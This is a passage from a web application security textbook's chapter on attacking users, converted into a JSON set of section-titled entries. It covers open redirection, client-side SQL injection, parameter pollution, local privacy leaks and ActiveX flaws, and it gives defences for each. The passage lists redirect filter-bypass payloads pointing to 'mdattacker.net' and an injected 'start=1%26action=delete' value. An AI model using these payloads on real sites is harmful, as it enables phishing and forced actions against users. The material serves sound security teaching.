requested. These vulnerabilities usually are\nof much less interest to an attacker than cross-site scripting, which can be used\nto perform a much wider range of malicious actions. Open redirection bugs\nare primarily of use in phishing attacks in which an attacker seeks to induce a\nvictim to visit a spoofed website and enter sensitive details. A redirection vul-\nnerability can lend credibility to the attacker’s overtures to potential victims,\nbecause it enables him to construct a URL that points to the authentic website\nhe is targeting. Therefore, this URL is more convincing, and anyone who visits\nit is redirected silently to a website that the attacker controls.\nThat said, the majority of real-world phishing-style attacks use other techniques\nto gain credibility that are outside the control of the application being targeted.\nExamples include registering similar domain names, using offi cial-sounding sub-\ndomains, and creating a simple mismatch between the anchor text and the target\nURLs of links in HTML e-mails. Research has indicated that most users cannot\nor are not inclined to make security decisions based on URL structure. For these\nreasons, the value to phishermen of a typical open redirection bug is fairly marginal.\nIn recent years, open redirection vulnerabilities have been used in a relatively\nbenign way to perform “rickrolling” attacks, in which victims are unwittingly\nredirected to a video of British pop legend Rick Astley, as illustrated in Figure 13-5.\nFigure 13-5: The result of a rickrolling attack\ncc1133..iinndddd 554411 88//1199//22001111 1122::1144::0011 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 542\n542 Chapter 13 n Attacking Users: Other Techniques\nFinding and Exploiting Open Redirection Vulnerabilities\nThe fi rst step in locating open redirection vulnerabilities is to identify every\ninstance within the application where a redirect occurs. An application can\ncause the user’s browser to redirect to a different URL in several ways:\nn An HTTP redirect uses a message with a 3xx status code and a Location\nheader specifying the target of the redirect:\nHTTP/1.1 302 Object moved\nLocation: http://mdsec.net/updates/update29.html\nn The HTTP Refresh header can be used to reload a page with an arbitrary\nURL after a fi xed interval, which may be 0 to trigger an immediate redirect:\nHTTP/1.1 200 OK\nRefresh: 0; url=http://mdsec.net/updates/update29.html\nn The HTML <meta> tag can be used to replicate the behavior of any HTTP\nheader and therefore can be used for redirection:\nHTTP/1.1 200 OK\nContent-Length: 125\n<html>\n<head>\n<meta http-equiv=”refresh” content=\n“0;url=http://mdsec.net/updates/update29.html”>\n</head>\n</html>\nn Various APIs exist within JavaScript that can be used to redirect the browser\nto an arbitrary URL:\nHTTP/1.1 200 OK\nContent-Length: 120\n<html>\n<head>\n<script>\ndocument.location=”http://mdsec.net/updates/update29.html”;\n</script>\n</head>\n</html>\nIn each of these cases, an absolute or relative URL may be specifi ed.\ncc1133..iinndddd 554422 88//1199//22001111 1122::1144::0011 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 543\nChapter 13 n Attacking Users: Other Techniques 543\nHACK STEPS\n1. Identify every instance within the application where a redirect occurs.\n2. An effective way to do this is to walk through the application using an\nintercepting proxy and monitor the requests made for actual pages (as\nopposed to other resources, such as images, stylesheets, and script files).\n3. If a single navigation action results in more than one request in succes-\nsion, investigate what means of performing the redirect is being used.\nThe majority of redirects are not user-controllable. For example, in a typical\nlogin mechanism, submitting valid credentials to /login.jsp might return an\nHTTP redirect to /myhome.jsp. The target of the redirect is always the same, so\nit is not subject to any vulnerabilities involving redirection.\nHowever, in other cases, data supplied by the user is used in some way to\nset the target of the redirect. A common instance of this is when an applica-\ntion forces users whose sessions have expired to return to the login page and\nthen redirects them to the original URL following successful reauthentication.\nIf you encounter this type of behavior, the application may be vulnerable to a\nredirection attack, and you should investigate further to determine whether\nthe behavior is exploitable.\nHACK STEPS\n1. If the user data being processed in a redirect contains an absolute URL,\nmodify the domain name within the URL, and test whether the application\nredirects you to the different domain.\n2. If the user data being processed contains a relative URL, modify this into\nan absolute URL for a different domain, and test whether the application\nredirects you to this domain.\n3. In both cases, if you see behavior like the following, the application is cer-\ntainly vulnerable to an arbitrary redirection attack:\nGET /updates/8/?redir=http://mdattacker.net/ HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 302 Object moved\nLocation: http://mdattacker.net/\ncc1133..iinndddd 554433 88//1199//22001111 1122::1144::0022 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 544\n544 Chapter 13 n Attacking Users: Other Techniques\nTRY IT!\nhttp://mdsec.net/updates/8/\nhttp://mdsec.net/updates/14/\nhttp://mdsec.net/updates/18/\nhttp://mdsec.net/updates/23/\nhttp://mdsec.net/updates/48/\nNOTE A related phenomenon, which is not quite the same as redirection,\noccurs when an application specifi es the target URL for a frame using user-\ncontrollable data. If you can construct a URL that causes content from an\nexternal URL to be loaded into a child frame, you can perform a fairly stealthy\nredirection-style attack. You can replace only part of an application’s existing\ninterface with different content and leave the domain of the browser address\nbar unmodifi ed.\nIt is common to encounter situations in which user-controllable data is being\nused to form the target of a redirect but is being fi ltered or sanitized in some\nway by the application, usually in an attempt to block redirection attacks. In\nthis situation, the application may or may not be vulnerable, and your next task\nshould be to probe the defenses in place to determine whether they can be cir-\ncumvented to perform arbitrary redirection. The two general types of defenses\nyou may encounter are attempts to block absolute URLs and the addition of a\nspecifi c absolute URL prefi x.\nBlocking of Absolute URLs\nThe application may check whether the user-supplied string starts with http://\nand, if so, block the request. In this situation, the following tricks may succeed\nin causing a redirect to an external website (note the leading space at the begin-\nning of the third line):\nHtTp://mdattacker.net\n%00http://mdattacker.net\nhttp://mdattacker.net\n//mdattacker.net\n%68%74%74%70%3a%2f%2fmdattacker.net\n%2568%2574%2574%2570%253a%252f%252fmdattacker.net\nhttps://mdattacker.net\nhttp:\\\\mdattacker.net\nhttp:///mdattacker.net\nAlternatively, the application may attempt to sanitize absolute URLs by remov-\ning http:// and any external domain specifi ed. In this situation, any of the\ncc1133..iinndddd 554444 88//1199//22001111 1122::1144::0022 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 545\nChapter 13 n Attacking Users: Other Techniques 545\npreceding bypasses may be successful, and the following attacks should also\nbe tested:\nhttp://http://mdattacker.net\nhttp://mdattacker.net/http://mdattacker.net\nhthttp://tp://mdattacker.net\nSometimes, the application may verify that the user-supplied string either\nstarts with or contains an absolute URL to its own domain name. In this situa-\ntion, the following bypasses may be effective:\nhttp://mdsec.net.mdattacker.net\nhttp://mdattacker.net/?http://mdsec.net\nhttp://mdattacker.net/%23http://mdsec.net\nTRY IT!\nhttp://mdsec.net/updates/52/\nhttp://mdsec.net/updates/57/\nhttp://mdsec.net/updates/59/\nhttp://mdsec.net/updates/66/\nhttp://mdsec.net/updates/69/\nAddition of an Absolute Prefix\nThe application may form the target of the redirect by appending the user-\ncontrollable string to an absolute URL prefi x:\nGET /updates/72/?redir=/updates/update29.html HTTP/1.1\nHost: mdsec.net\nHTTP/1.1 302 Object moved\nLocation: http://mdsec.net/updates/update29.html\nIn this situation, the application may or may not be vulnerable. If the prefi x\nused consists of http:// and the application’s domain name but does not include\na slash character after the domain name, it is vulnerable. For example, the URL:\nhttp://mdsec.net/updates/72/?redir=.mdattacker.net\ncauses a redirect to:\nhttp://mdsec.net.mdattacker.net\nThis URL is under the attacker’s control, assuming that he controls the DNS\nrecords for the domain mdattacker.net.\nHowever, if the absolute URL prefi x includes a trailing slash, or a subdirectory\non the server, the application probably is not vulnerable to a redirection attack\ncc1133..iinndddd 554455 88//1199//22001111 1122::1144::0022 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 546\n546 Chapter 13 n Attacking Users: Other Techniques\naimed at an external domain. The best an attacker can probably achieve is to\nframe a URL that redirects a user to a different URL within the same applica-\ntion. This attack normally does not accomplish anything, because if the attacker\ncan induce a user to visit one URL within the application, he can presumably\njust as easily feed the second URL to the user directly.\nTRY IT!\nhttp://mdsec.net/updates/72/\nIn cases where the redirect is initiated using client-side JavaScript that queries\ndata from the DOM, all the code responsible for performing the redirect and any\nassociated validation typically are visible on the client. You should review this\nclosely to determine how user-controllable data is being incorporated into the\nURL, whether any validation is being performed, and, if so, whether any bypasses\nto the validation exist. Bear in mind that, as with DOM-based XSS, some addi-\ntional validation may be performed on the server before the script is returned\nto the browser. The following JavaScript APIs may be used to perform redirects:\nn document.location\nn document.URL\nn document.open()\nn window.location.href\nn window.navigate()\nn window.open()\nTRY IT!\nhttp://mdsec.net/updates/76/\nhttp://mdsec.net/updates/79/\nhttp://mdsec.net/updates/82/\nhttp://mdsec.net/updates/91/\nhttp://mdsec.net/updates/92/\nhttp://mdsec.net/updates/95/\nPreventing Open Redirection Vulnerabilities\nThe most effective way to avoid open redirection vulnerabilities is to not incor-\nporate user-supplied data into the target of a redirect. Developers are inclined\nto use this technique for various reasons, but alternatives usually are available.\nFor example, it is common to see a user interface that contains a list of links,\ncc1133..iinndddd 554466 88//1199//22001111 1122::1144::0022 PPMM"
  },
  {
    "input": "Client-Side SQL Injection",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 547\nChapter 13 n Attacking Users: Other Techniques 547\neach pointing to a redirection page and passing a target URL as a parameter.\nHere, possible alternative approaches include the following:\nn Remove the redirection page from the application, and replace links to it\nwith direct links to the relevant target URLs.\nn Maintain a list of all valid URLs for redirection. Instead of passing the\ntarget URL as a parameter to the redirect page, pass an index into this\nlist. The redirect page should look up the index in its list and return a\nredirect to the relevant URL.\nIf it is considered unavoidable for the redirection page to receive user-con-\ntrollable input and incorporate this into the redirect target, one of the following\nmeasures should be used to minimize the risk of redirection attacks:\nn The application should use relative URLs in all its redirects, and the redi-\nrect page should strictly validate that the URL received is a relative URL.\nIt should verify that the user-supplied URL either begins with a single\nslash followed by a letter or begins with a letter and does not contain a\ncolon character before the fi rst slash. Any other input should be rejected,\nnot sanitized.\nn The application should use URLs relative to the web root for all its redi-\nrects, and the redirect page should prepend http://yourdomainname.com\nto all user-supplied URLs before issuing the redirect. If the user-supplied\nURL does not begin with a slash character, it should instead be prepended\nwithhttp://yourdomainname.com/.\nn The application should use absolute URLs for all redirects, and the redi-\nrect page should verify that the user-supplied URL begins with http://\nyourdomainname.com/ before issuing the redirect. Any other input should\nbe rejected.\nAs with DOM-based XSS vulnerabilities, it is recommended that applications\nnot perform redirects via client-side scripts on the basis of DOM data, because\nthis data is outside of the server’s direct control.\nClient-Side SQL Injection\nHTML5 supports client-side SQL databases, which applications can use to store\ndata on the client. These are accessed using JavaScript, as in the following example:\nvar db = openDatabase(‘contactsdb’, ‘1.0’, ‘WahhMail contacts’, 1000000);\ndb.transaction(function (tx) {\ntx.executeSql(‘CREATE TABLE IF NOT EXISTS contacts (id unique, name,\nemail)’);\ntx.executeSql(‘INSERT INTO contacts (id, name, email) VALUES (1, “Matthew\nAdamson”, “madam@nucnt.com”)’);\n});\ncc1133..iinndddd 554477 88//1199//22001111 1122::1144::0022 PPMM"
  },
  {
    "input": "Client-Side HTTP Parameter Pollution",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 548\n548 Chapter 13 n Attacking Users: Other Techniques\nThis functionality allows applications to store commonly used data on the\nclient side and retrieve this quickly into the user interface when required. It also\nallows applications to work in “offl ine mode,” in which all data processed by\nthe application resides on the client, and user actions are stored on the client for\nlater synchronization with the server, when a network connection is available.\nChapter 9 described how SQL injection attacks into server-side SQL databases\ncan arise, where attacker-controlled data is inserted into a SQL query in an\nunsafe way. Exactly the same attack can arise on the client side. Here are some\nscenarios in which this may be possible:\nn Social networking applications that store details of the user’s contacts in\nthe local database, including contact names and status updates\nn News applications that store articles and user comments in the local\ndatabase for offl ine viewing\nn Web mail applications that store e-mail messages in the local database\nand, when running in offl ine mode, store outgoing messages for later\nsending\nIn these situations, an attacker may be able to perform client-side SQL injec-\ntion attacks by including crafted input in a piece of data he controls, which the\napplication stores locally. For example, sending an e-mail containing a SQL\ninjection attack in the subject line might compromise the local database of the\nrecipient user, if this data is embedded within a client-side SQL query. Depending\non exactly how the application uses the local database, serious attacks may be\npossible. Using only SQL injection, an attacker may be able to retrieve from the\ndatabase the contents of other messages the user has received, copy this data\ninto a new outgoing e-mail to the attacker, and add this e-mail to the table of\nqueued outgoing messages.\nThe types of data that are often stored in client-side databases are likely to\ninclude SQL metacharacters such as the single quotation mark. Therefore, many\nSQL injection vulnerabilities are likely to be identifi ed during normal usabil-\nity testing, so defenses against SQL injection attacks may be in place. As with\nserver-side injection, these defenses may contain various bypasses that can be\nused to still deliver a successful attack.\nClient-Side HTTP Parameter Pollution\nChapter 9 described how HTTP parameter pollution attacks can be used in some\nsituations to interfere with server-side application logic. In some situations, these\nattacks may also be possible on the client side.\nSuppose that a web mail application loads the inbox using the following URL:\nhttps://wahh-mail.com/show?folder=inbox&order=down&size=20&start=1\ncc1133..iinndddd 554488 88//1199//22001111 1122::1144::0022 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 549\nChapter 13 n Attacking Users: Other Techniques 549\nWithin the inbox, several links are displayed next to each message to perform\nactions such as delete, forward, and reply. For example, the link to reply to mes-\nsage number 12 is as follows:\n<a href=”doaction?folder=inbox&order=down&size=20&start=1&message=12&action=\nreply&rnd=1935612936174”>reply</a>\nSeveral parameters within these links are being copied from parameters in\nthe inbox URL. Even if the application defends robustly against XSS attacks, it\nmay still be possible for an attacker to construct a URL that displays the inbox\nwith different values echoed within these links. For example, the attacker can\nsupply a parameter like this:\nstart=1%26action=delete\nThis contains a URL-encoded & character that the application server will\nautomatically decode. The value of the start parameter that is passed to the\napplication is as follows:\n1&action=delete\nIf the application accepts this invalid value and still displays the inbox, and\nif it echoes the value without modifi cation, the link to reply to message number\n12 becomes this:\n<a href=”doaction?folder=inbox&order=down&size=20&start=1&action=delete&\nmessage=12&action=reply&rnd=1935612936174”>reply</a>\nThis link now contains two action parameters—one specifying delete, and\none specifying reply. As with standard HTTP parameter pollution, the applica-\ntion’s behavior when the user clicks the “reply” link depends on how it handles\nthe duplicated parameter. In many cases, the fi rst value is used, so the user is\nunwittingly induced to delete any messages he tries to reply to.\nIn this example, note that the links to perform actions contain an rnd param-\neter, which is in fact an anti-CSRF token, preventing an attacker from easily\ninducing these actions via a standard CSRF attack. Since the client-side HPP\nattack injects into existing links constructed by the application, the anti-CSRF\ntokens are handled in the normal way and do not prevent the attack.\nIn most real-world web mail applications, it is likely that many more actions\nexist that can be exploited, including deleting all messages, forwarding indi-\nvidual messages, and creating general mail forwarding rules. Depending on\nhow these actions are implemented, it may be possible to inject several required\nparameters into links, and even exploit on-site redirection functions, to induce\nthe user to perform complex actions that normally are protected by anti-CSRF\ndefenses. Furthermore, it may be possible to use multiple levels of URL encod-\ning to inject several attacks into a single URL. That way, for example, one action\ncc1133..iinndddd 554499 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Persistent Cookies",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 550\n550 Chapter 13 n Attacking Users: Other Techniques\nis performed when the user attempts to read a message, and a further action is\nperformed when the user attempts to return to the inbox.\nLocal Privacy Attacks\nMany users access web applications from a shared environment in which an\nattacker may have direct access to the same computer as the user. This gives\nrise to a range of attacks to which insecure applications may leave their users\nvulnerable. This kind of attack may arise in several areas.\nNOTE Numerous mechanisms exist by which applications may store\npotentially sensitive data on users’ computers. In many cases, to test\nwhether this is being done, it is preferable to start with a completely clean\nbrowser so that data stored by the application being tested is not lost in\nthe noise of existing stored data. An ideal way to do this is using a virtual\nmachine with a clean installation of both the operating system and any\nbrowsers.\nFurthermore, on some operating systems, the folders and fi les containing\nlocally stored data may be hidden by default when using the built-in fi le sys-\ntem explorer. To ensure that all relevant data is identifi ed, you should confi g-\nure your computer to show all hidden and operating system fi les.\nPersistent Cookies\nSome applications store sensitive data in a persistent cookie, which most brows-\ners save on the local fi le system.\nHACK STEPS\n1. Review all the cookies identified during your application mapping exer-\ncises (see Chapter 4). If any Set-cookie instruction contains an expires\nattribute with a date that is in the future, this will cause the browser to\npersist that cookie until that date. For example:\nUID=d475dfc6eccca72d0e expires=Fri, 10-Aug-18 16:08:29 GMT;\n2. If a persistent cookie is set that contains any sensitive data, a local\nattacker may be able to capture this data. Even if a persistent cookie con-\ntains an encrypted value, if this plays a critical role such as reauthenticat-\ning the user without entering credentials, an attacker who captures it can\nresubmit it to the application without actually deciphering its contents\n(see Chapter 6).\ncc1133..iinndddd 555500 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Cached Web Content",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 551\nChapter 13 n Attacking Users: Other Techniques 551\nTRY IT!\nhttp://mdsec.net/auth/227/\nCached Web Content\nMost browsers cache non-SSL web content unless a website specifi cally instructs\nthem not to. The cached data normally is stored on the local fi le system.\nHACK STEPS\n1. For any application pages that are accessed over HTTP and that contain\nsensitive data, review the details of the server’s response to identify any\ncache directives.\n2. The following directives prevent browsers from caching a page. Note that\nthese may be specified within the HTTP response headers or within HTML\nmetatags:\nExpires: 0\nCache-control: no-cache\nPragma: no-cache\n3. If these directives are not found, the page concerned may be vulnerable to\ncaching by one or more browsers. Note that cache directives are processed on\na per-page basis, so every sensitive HTTP-based page needs to be checked.\n4. To verify that sensitive information is being cached, use a default instal-\nlation of a standard browser, such as Internet Explorer or Firefox. In the\nbrowser’s configuration, completely clean its cache and all cookies, and\nthen access the application pages that contain sensitive data. Review the\nfiles that appear in the cache to see if any contain sensitive data. If a large\nnumber of files are being generated, you can take a specific string from a\npage’s source and search the cache for that string.\nHere are the default cache locations for common browsers:\nn Internet Explorer—Subdirectories of C:\\Documents and Settings\\\nusername\\Local Settings\\Temporary Internet Files\\\nContent.IE5\nNote that in Windows Explorer, to view this folder you need to enter this\nexact path and have hidden folders showing, or browse to the folder just\nlisted from the command line.\nn Firefox (on Windows)—C:\\Documents and Settings\\username\\\nLocal Settings\\Application Data\\Mozilla\\Firefox\\\nProfiles\\profile name\\Cache\nn Firefox (on Linux)—~/.mozilla/firefox/profile name/Cache\ncc1133..iinndddd 555511 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Autocomplete",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 552\n552 Chapter 13 n Attacking Users: Other Techniques\nTRY IT!\nhttp://mdsec.net/auth/249/\nBrowsing History\nMost browsers save a browsing history, which may include any sensitive data\ntransmitted in URL parameters.\nHACK STEPS\n1. Identify any instances within the application in which sensitive data is\nbeing transmitted via a URL parameter.\n2. If any cases exist, examine the browser history to verify that this data has\nbeen stored there.\nTRY IT!\nhttp://mdsec.net/auth/90/\nAutocomplete\nMany browsers implement a user-confi gurable autocomplete function for text-\nbased input fi elds, which may store sensitive data such as credit card numbers,\nusernames, and passwords. Internet Explorer stores autocomplete data in the\nregistry, and Firefox stores it on the fi le system.\nAs already described, in addition to being accessible by local attackers, data in\nthe autocomplete cache can be retrieved via an XSS attack in certain circumstances.\nHACK STEPS\n1. Review the HTML source code for any forms that contain text fields in\nwhich sensitive data is captured.\n2. If the attribute autocomplete=off is not set, within either the form\ntag or the tag for the individual input field, data entered is stored within\nbrowsers where autocomplete is enabled.\nTRY IT!\nhttp://mdsec.net/auth/260/\ncc1133..iinndddd 555522 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Silverlight Isolated Storage",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 553\nChapter 13 n Attacking Users: Other Techniques 553\nFlash Local Shared Objects\nThe Flash browser extension implements its own local storage mechanism called\nLocal Shared Objects (LSOs), also called Flash cookies. In contrast to most other\nmechanisms, data persisted in LSOs is shared between different browser types,\nprovided that they have the Flash extension installed.\nHACK STEPS\n1. Several plug-ins are available for Firefox, such as BetterPrivacy, which can\nbe used to browse the LSO data created by individual applications.\n2. You can review the contents of the raw LSO data directly on disk. The\nlocation of this data depends on the browser and operating system. For\nexample, on recent versions of Internet Explorer, the LSO data resides\nwithin the following folder structure:\nC:\\Users\\{username}\\AppData\\Roaming\\Macromedia\\Flash Player\\\n#SharedObjects\\{random}\\{domain name}\\{store name}\\{name of\nSWF file}\nTRY IT!\nhttp://mdsec.net/auth/245/\nSilverlight Isolated Storage\nThe Silverlight browser extension implements its own local storage mechanism\ncalled Silverlight Isolated Storage.\nHACK STEPS\nYou can review the contents of the raw Silverlight Isolated Storage data\ndirectly on disk. For recent versions of Internet Explorer, this data resides\nwithin a series of deeply nested, randomly named folders at the following\nlocation:\nC:\\Users\\{username}\\AppData\\LocalLow\\Microsoft\\Silverlight\\\nTRY IT!\nhttp://mdsec.net/auth/239/\ncc1133..iinndddd 555533 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Preventing Local Privacy Attacks",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 554\n554 Chapter 13 n Attacking Users: Other Techniques\nInternet Explorer userData\nInternet Explorer implements its own custom local storage mechanism called\nuserData.\nHACK STEPS\nYou can review the contents of the raw data stored in IE’s userData directly on\ndisk. For recent versions of Internet Explorer, this data resides within the fol-\nlowing folder structure:\nC:\\Users\\user\\AppData\\Roaming\\Microsoft\\Internet Explorer\\\nUserData\\Low\\{random}\nTRY IT!\nhttp://mdsec.net/auth/232/\nHTML5 Local Storage Mechanisms\nHTML5 is introducing a range of new local storage mechanisms, including:\nn Session storage\nn Local storage\nn Database storage\nThe specifi cations and usage of these mechanisms are still evolving. They are\nnot fully implemented in all browsers, and details of how to test for their usage\nand review any persisted data are likely to be browser-dependent.\nPreventing Local Privacy Attacks\nApplications should avoid storing anything sensitive in a persistent cookie.\nEven if this data is encrypted, it can potentially be resubmitted by an attacker\nwho captures it.\nApplications should use suitable cache directives to prevent sensitive data\nfrom being stored by browsers. In ASP applications, the following instructions\ncause the server to include the required directives:\n<% Response.CacheControl = “no-cache” %>\n<% Response.AddHeader “Pragma”, “no-cache” %>\n<% Response.Expires = 0 %>\nIn Java applications, the following commands should achieve the same result:\ncc1133..iinndddd 555544 88//1199//22001111 1122::1144::0033 PPMM"
  },
  {
    "input": "Attacking ActiveX Controls",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 555\nChapter 13 n Attacking Users: Other Techniques 555\n<%\nresponse.setHeader(“Cache-Control”,”no-cache”);\nresponse.setHeader(“Pragma”,”no-cache”);\nresponse.setDateHeader (“Expires”, 0);\n%>\nApplications should never use URLs to transmit sensitive data, because these\nare liable to be logged in numerous locations. All such data should be transmit-\nted using HTML forms that are submitted using the POST method.\nIn any instance where users enter sensitive data into text input fi elds, the\nautocomplete=off attribute should be specifi ed within the form or fi eld tag.\nOther client-side storage mechanisms, such as the new features being intro-\nduced with HTML5, provide an opportunity for applications to implement\nvaluable application functionality, including much faster access to user-specifi c\ndata and the ability to keep working when network access is not available. In\ncases where sensitive data needs to be stored locally, this should ideally be\nencrypted to prevent easy direct access by an attacker. Furthermore, users\nshould be advised of the nature of the data that is being stored locally, warned\nof the risks of local access by an attacker, and allowed to opt out of this feature\nif they want to.\nAttacking ActiveX Controls\nChapter 5 described how applications can use various thick-client technologies\nto distribute some of the application’s processing to the client side. ActiveX con-\ntrols are of particular interest to an attacker who targets other users. When an\napplication installs a control to invoke it from its own pages, the control must be\nregistered as “safe for scripting.” After this occurs, any other website accessed\nby the user can use that control.\nBrowsers do not accept just any ActiveX control that a website asks them to\ninstall. By default, when a website seeks to install a control, the browser pres-\nents a security warning and asks the user for permission. The user can decide\nwhether she trusts the website issuing the control and allow it to be installed\naccordingly. However, if she does so, and the control contains any vulnerabilities,\nthese can be exploited by any malicious website the user visits.\nTwo main categories of vulnerability commonly found within ActiveX controls\nare of interest to an attacker:\nn Because ActiveX controls typically are written in native languages such\nas C/C++, they are at risk from classic software vulnerabilities such as\nbuffer overfl ows, integer bugs, and format string fl aws (see Chapter 16\nfor more details). In recent years, a huge number of these vulnerabilities\ncc1133..iinndddd 555555 88//1199//22001111 1122::1144::0044 PPMM"
  },
  {
    "input": "Finding ActiveX Vulnerabilities",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 556\n556 Chapter 13 n Attacking Users: Other Techniques\nhave been identifi ed within the ActiveX controls issued by popular web\napplications, such as online gaming sites. These vulnerabilities normally\ncan be exploited to cause arbitrary code execution on the computer of\nthe victim user.\nn Many ActiveX controls contain methods that are inherently dangerous\nand vulnerable to misuse:\nn LaunchExe(BSTR ExeName)\nn SaveFile(BSTR FileName, BSTR Url)\nn LoadLibrary(BSTR LibraryPath)\nn ExecuteCommand(BSTR Command)\nMethods like these usually are implemented by developers to build some\nfl exibility into their control, enabling them to extend its functionality in the\nfuture without needing to deploy a fresh control. However, after the control\nis installed, it can, of course, be “extended” in the same way by any malicious\nwebsite to carry out undesirable actions against the user.\nFinding ActiveX Vulnerabilities\nWhen an application installs an ActiveX control, in addition to the browser\nalert that asks your permission to install it, you should see code similar to the\nfollowing within the HTML source of an application page:\n<object id=”oMyObject”\nclassid=”CLSID:A61BC839-5188-4AE9-76AF-109016FD8901”\ncodebase=”https://wahh-app.com/bin/myobject.cab”>\n</object>\nThis code tells the browser to instantiate an ActiveX control with the speci-\nfi ed name and classid and to download the control from the specifi ed URL. If\na control is already installed, the codebase parameter is not required, and the\nbrowser locates the control from the local computer, based on its unique classid.\nIf a user gives permission to install the control, the browser registers it as “safe\nfor scripting.” This means that it can be instantiated, and its methods invoked,\nby any website in the future. To verify for sure that this has been done, you can\ncheck the registry key HKEY_CLASSES_ROOT\\CLSID\\classid of control taken\nfrom above HTML\\Implemented Categories. If the subkey 7DD95801-9882-\n11CF-9FA9-00AA006C42C4 is present, the control has been registered as “safe for\nscripting,” as shown in Figure 13-6.\ncc1133..iinndddd 555566 88//1199//22001111 1122::1144::0044 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 557\nChapter 13 n Attacking Users: Other Techniques 557\nFigure 13-6: A control registered as safe for scripting\nWhen the browser has instantiated an ActiveX control, individual methods\ncan be invoked as follows:\n<script>\ndocument.oMyObject.LaunchExe(‘myAppDemo.exe’);\n</script>\nHACK STEPS\nA simple way to probe for ActiveX vulnerabilities is to modify the HTML that\ninvokes the control, pass your own parameters to it, and monitor the results:\n1. Vulnerabilities such as buffer overflows can be probed for using the same\nkind of attack payloads described in Chapter 16. Triggering bugs of this\nkind in an uncontrolled manner is likely to result in a crash of the browser\nprocess that is hosting the control.\n2. Inherently dangerous methods such as LaunchExe can often be identi-\nfied simply by their name. In other cases, the name may be innocuous or\nobfuscated, but it may be clear that interesting items such as filenames,\nURLs, or system commands are being passed as parameters. You should\ntry modifying these parameters to arbitrary values and determine whether\nthe control processes your input as expected.\nIt is common to fi nd that not all the methods implemented by a control are\nactually invoked anywhere within the application. For example, methods may\nhave been implemented for testing purposes, may have been superseded but\nnot removed, or may exist for future use or self-updating purposes. To perform\na comprehensive test of a control, it is necessary to enumerate all the attack\nsurface it exposes through these methods, and test all of them.\ncc1133..iinndddd 555577 88//1199//22001111 1122::1144::0044 PPMM"
  },
  {
    "input": "Preventing ActiveX Vulnerabilities",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 558\n558 Chapter 13 n Attacking Users: Other Techniques\nVarious tools exist for enumerating and testing the methods exposed by\nActiveX controls. One useful tool is COMRaider by iDefense, which can display\nall of a control’s methods and perform basic fuzz testing of each, as shown in\nFigure 13-7.\nFigure 13-7: COMRaider showing the methods of an ActiveX control\nPreventing ActiveX Vulnerabilities\nDefending native compiled software components against attack is a large and\ncomplex topic that is outside the scope of this book. Basically, the designers and\ndevelopers of an ActiveX control must ensure that the methods it implements\ncannot be invoked by a malicious website to carry out undesirable actions against\na user who has installed it. For example:\nn A security-focused source code review and penetration test should be car-\nried out on the control to locate vulnerabilities such as buffer overfl ows.\nn The control should not expose any inherently dangerous methods that\ncall out to the fi lesystem or operating system using user-controllable\ncc1133..iinndddd 555588 88//1199//22001111 1122::1144::0044 PPMM"
  },
  {
    "input": "Attacking the Browser",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 559\nChapter 13 n Attacking Users: Other Techniques 559\ninput. Safer alternatives are usually available with minimal extra effort.\nFor example, if it is considered necessary to launch external processes,\ncompile a list of all the external processes that may legitimately and safely\nbe launched. Then either create a separate method to call each one or use\na single method that takes an index number into this list.\nAs an additional defense-in-depth precaution, some ActiveX controls\nvalidate the domain name that issued the HTML page from which they\nare being invoked. Microsoft’s SiteLock Active Template Library template\nallows developers to restrict the use of an ActiveX control to a specifi c list\nof domain names.\nSome controls go even further by requiring that all parameters passed to the\ncontrol must be cryptographically signed. If the signature passed is invalid, the\ncontrol does not carry out the requested action. You should be aware that some\ndefenses of this kind can be circumvented if the website that is permitted to\ninvoke the control contains any XSS vulnerabilities.\nAttacking the Browser\nThe attacks described so far in this and the preceding chapter involve exploiting\nsome feature of an application’s behavior to compromise users of the application.\nAttacks such as cross-site scripting, cross-site request forgery, and JavaScript\nhijacking all arise from vulnerabilities within specifi c web applications, even\nthough the details of some exploit techniques may leverage quirks within spe-\ncifi c browsers.\nA further category of attacks against users does not depend on the behav-\nior of specifi c applications. Rather, these attacks rely solely on features of\nthe browser’s behavior, or on the design of core web technologies them-\nselves. These attacks can be delivered by any malicious website or by any\nbenign site that has itself been compromised. As such, they lie at the edge\nof the scope of a book about hacking web applications. Nevertheless, they\nare worthy of brief consideration partly because they share some features\nwith attacks that exploit application-specifi c functions. They also provide\ncontext for understanding the impact of various application behaviors by\nshowing what is possible for an attacker to achieve even in the absence of\nany application-specifi c fl aws.\nThe discussion in the following sections is necessarily concise. There is cer-\ntainly room for an entire book to be written on this subject. Would-be authors\nwith a signifi cant amount of spare time are encouraged to submit a proposal\nto Wiley for TheBrowserHacker’sHandbook.\ncc1133..iinndddd 555599 88//1199//22001111 1122::1144::0044 PPMM"
  },
  {
    "input": "Enumerating Currently Used Applications",
